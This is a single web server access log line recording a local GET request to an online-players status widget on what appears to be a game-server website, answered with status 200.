127.0.0.1 - - [13/Mar/2021:04:05:18 +0100] "GET /wow/sidebox_online_players_extended/status HTTP/1.1" 200 1292 "http://localhost/wow/news" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0"
